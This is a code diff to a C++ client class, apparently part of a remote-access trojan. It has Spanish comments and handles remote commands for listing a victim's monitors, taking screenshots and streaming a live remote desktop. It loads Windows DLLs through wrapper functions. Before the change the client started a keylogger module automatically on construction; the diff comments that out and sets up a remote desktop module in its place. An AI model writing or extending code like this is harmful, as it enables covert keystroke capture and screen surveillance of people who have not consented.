@@ -108,6 +108,7 @@ Cliente::Cliente() {
     this->hShell32DLL = wrapLoadDLL("shell32.dll");
     this->hWtsapi32DLL = wrapLoadDLL("Wtsapi32.dll");
     this->hPsApiDLL = wrapLoadDLL("psapi.dll");
+    this->hUser23DLL = wrapLoadDLL("user32.dll");
 
     
     if (this->hKernel32DLL) {
@@ -152,8 +153,9 @@ Cliente::Cliente() {
     }
  
     //this->mod_Fun = new modFun();
-    this->mod_Key = new mod_Keylogger();
-    this->mod_Key->Start();
+    //this->mod_Key = new mod_Keylogger();
+    //this->mod_Key->Start();
+    this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
 
 }
 
@@ -176,6 +178,14 @@ Cliente::~Cliente() {
 
     if (this->hWtsapi32DLL) {
         wrapFreeLibrary(this->hWtsapi32DLL);
+    }
+
+    if (this->hPsApiDLL) {
+        wrapFreeLibrary(this->hPsApiDLL);
+    }
+
+    if (this->hUser23DLL) {
+        wrapFreeLibrary(this->hUser23DLL);
     }
 }
 
@@ -734,7 +744,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Lista de pantallas
     if (iComando == EnumComandos::RD_Lista) {
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
         }
         std::string strPaquete = "";
         std::vector<Monitor> Monitores = this->mod_RemoteDesk->m_ListaMonitores();
@@ -764,7 +774,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     if (iComando == EnumComandos::RD_Single) {
         //Enviar solo una captura
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
         }
         //Si estra creado pero si no se esta en modo live
         if (this->mod_RemoteDesk && !this->mod_RemoteDesk->m_isRunning()) {
@@ -792,7 +802,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //Iniciar live
     if (iComando == EnumComandos::RD_Start) {
         if (!this->mod_RemoteDesk) {
-            this->mod_RemoteDesk = new mod_RemoteDesktop();
+            this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
         }
         if (this->mod_RemoteDesk) {
             strIn = strSplit(std::string(paquete.cBuffer.data()), '|', 2);
